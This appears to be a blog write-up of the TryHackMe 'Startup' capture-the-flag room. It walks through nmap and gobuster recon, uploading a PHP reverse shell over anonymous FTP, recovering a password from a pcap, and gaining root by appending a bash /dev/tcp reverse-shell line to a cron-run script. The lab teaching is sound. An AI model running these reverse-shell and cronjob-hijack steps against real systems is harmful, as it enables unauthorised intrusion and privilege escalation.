---
title: TryHackMe Startup
date: 2024-03-31 00:00:00 +0800
categories: [TryHackMe, Challenge]
tags: [walkthough,write-ups]     # TAG names should always be lowercase
image:
    path: https://tryhackme-images.s3.amazonaws.com/room-icons/98d1e206f2d58494b67a1a52c0f8d244.png
---

Abuse traditional vulnerabilities via untraditional means.

## **Skills Needed**

Wireshark - know  how to read network traffic nad you must be knowledgeable about TCP

Linux Privilege Escalation - cronjobs

Bash scripting

Network Service Pentesting


## **Reconnaissance**
---
Initially do the Nmap scan.

```bash
nmap -sC -sV -p- $IP --open
```
`--open`: Scans only the open ports and reduces the time it takes to complete the nmap scan.


```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-17 04:47 EDT
Nmap scan report for 10.10.163.200
Host is up (0.30s latency).
Not shown: 65531 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.13.50.82
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.74 seconds
```

## **Insights and To-TRY List**
---
OS: Ubuntu

80 → HTTP
- Apache httpd 2.4.18
- Found some files in /files directory
- Running PHP


21 → FTP
- Anon login allowed
- Can be used to upload reverse shell


22→ SSH
- No cred yet
- Found a name “Maya”

## **Enumeration**
---
### 80 HTTP

**Viewing the webpage.**

![Desktop View](/assets/images/startup/webpage.png){: width="972" height="589" }

**Viewing the source code.**

![Desktop View](/assets/images/startup/source-code.png){: width="972" height="589" }

Nothing interesting.


**Directory Busting**

```bash
gobuster dir -u http://10.10.163.200 -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt -t 30
```

```bash
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/files                (Status: 301) [Size: 314] [--> http://10.10.163.200/files/]
/server-status        (Status: 403) [Size: 278]
```

**Visiting /file endpoint**

![Desktop View](/assets/images/startup/file.png){: width="972" height="589" }

What is the content of these file? Let us check.

**notice.txt**

```
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```

> Who is Maya? It could be a username
{: .prompt-tip }

**File Busting**

```bash
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.                    (Status: 200) [Size: 1332]
/.php                 (Status: 403) [Size: 278]
/wp-forum.phps        (Status: 403) [Size: 278]
```

Looks like our server is using php for the backend. Let us try enumerating other network services.

### 21 FTP

We can see an anonymous login from our Nmap scan earlier. Let's try it.

```
ftp <IP>
```

List all the directories. Make sure to list all the hidden files.

```
ls -la
```

Afterwards, download the files what you deemed is useful.

```
get <FILENAME>
```

![Desktop View](/assets/images/startup/ftp.png){: width="972" height="589" }

The FTP does not contain any interesting files either. 


## **Gaining an Initial Foothold**

Based from the information we have gathered, they allowed us to have anonymous access for FTP, which means it is possible to uploaded a php reverse shell to gain an initial foothold.

There are my references for FTP Pentesting

[Exploit-Notes FTP Pentesting](https://exploit-notes.hdks.org/exploit/network/protocol/ftp-pentesting/)

Download the php-reverse-shell and edit the IP and listening port.

[Pentest-Monkey PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

![Desktop View](/assets/images/startup/php-reveshell.png){: width="972" height="589" }

Re-login via FTP and upload the php reverse shell to the ftp server

```
cd ftp
put <FILENAME>
```
![Desktop View](/assets/images/startup/ftp-revshell.png){: width="972" height="589" }

Establish a reverse shell by setting up a netcat listener to your attacking machine and  use the port you specified in the php file you have uploaded

```
nc -lnvp 1234
```

![Desktop View](/assets/images/startup/we-are-in.png){: width="972" height="589" }

Since we were able to obtain a foothold through reverse shell, we do not have a full TTY and will require a terminal upgrade. Hence,  we need to stabilize the dumb shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
OR
python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='clear -lsaht --color=auto'

**Ctrl + Z [Background Process]**
stty raw -echo ; fg ; reset
stty columns 200 rows 200
```
Credits to [S1REN](https://sirensecurity.io/blog/break-out-get-that-tty/)


> Do not forget to find the secret spicy soup recipe
{: .prompt-danger }


## **Privilege Escalation**
---

### **Part 1**
I initially check `sudo -l` command to list the permissions granted to the current user in the sudoers file. Unfortunately, it requires us to give a password.

Interestingly, there is an odd directory that contains pcap file.

![Desktop View](/assets/images/startup/pcap.png){: width="972" height="589" }

We download the file to our attacking machine. To do this, we need to setup a simple http server to our victim that will listen when the attach machine made a GET request.

**Victim machine command:**

```
python -m SimpleHTTPServer 8080
```
**Attacking machine command:**

```
wget http://192.168.1.39:8080/FiletoDownload
```

Open the suspicious.pcapng using wireshark

![Desktop View](/assets/images/startup/wireshark.png){: width="972" height="589" }

From here, we need to investigate what is going on with the network traffic being shown here. We can follow protocol streams to see the protocols how the application layer sees it.

For reference: [Following Protocol Streams (wireshark.org)](https://www.wireshark.org/docs/wsug_html_chunked/ChAdvFollowStreamSection.html)

To follow the TCP STream. Right click on the specific packet → Follow → TCP Stream

![Desktop View](/assets/images/startup/follow-streams.png){: width="972" height="589" }

Following the stream until stream 7, we can see that someone got in via reverse shell, stabilized their shell, changed to user lennie, and checked their sudo privilege

![Desktop View](/assets/images/startup/password.png){: width="972" height="589" }

Can we use the password we got to login to lennie?

```bash
su lennie
```
![Desktop View](/assets/images/startup/lennie.png){: width="972" height="589" }

![Desktop View](/assets/images/startup/whoami.png){: width="972" height="589" }


> Do not forget to find the user flag
{: .prompt-danger }

### **Part 2**

Looks like lennie have her fair share of tasks and secrets

![Desktop View](/assets/images/startup/lennie-files.png){: width="972" height="589" }

```
cat concern.txt
I got banned from your library for moving the "C programming language" book into the horror section. Is there a way I can appeal? --Lennie
```
LOL!


```
cat list.txt
Shoppinglist: Cyberpunk 2077 | Milk | Dog food
```

```
cat note.txt
Reminders: Talk to Inclinant about our lacking security, hire a web developer, delete incident logs.
```

Enough of the filler information. Let's get to examine how we can get to root.

![Desktop View](/assets/images/startup/scripts.png){: width="972" height="589" }

Looks like we have `planner.sh` and `startup_list.txt` which happened to be owned by **root**

```
cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```
First off, the 2nd line echo the value of the variable $LIST into a file named "startup_list.txt". However, upon viewing the text file, it is empty.

Secondly. It also executes another script named "print.sh" located in the /etc/ directory.

But how can we simply know if this shell script can be used?

![Desktop View](/assets/images/startup/cronjob.png){: width="972" height="589" }

From the image above, it seems that `planner.sh` is modifying the `startup_list.txt` file every minute. This indicates it is likely part of a cronjob that we can leverage to exploit privilege escalation.

It's worth noting that it not only modifies the text file but also executes another script located in `/etc`.


![Desktop View](/assets/images/startup/printsh.png){: width="972" height="589" }

Looks like lennie have write access to the print.sh found in /etc directory.

This means that we can edit the content of the print shell script and spawn our shell that has root access. You can use any text file editor you are comfortable using.

```bash
echo "/bin/bash -i >& /dev/tcp/10.13.50.82/8080 0>&1" >> print.sh
```

Do not forget to setup the listener first and edit the reverse shell script pointing to your attacker machine IP address and port. Then wait for the cronjob to execute.

![Desktop View](/assets/images/startup/rooted.png){: width="972" height="589" }

We got root!

![Desktop View](/assets/images/startup/pwned.png){: width="972" height="589" }

## **Take Away Concepts**
- You can upload a file to an FTP server as long as it is accessible or you’ve your way in
- Know the technologies behind the webserver. It can be through wappalyzer, banner grabbing, interecpting the web response, or by simply viewing the source code.
- Learning how to exploit cronjob is a necessary skill.


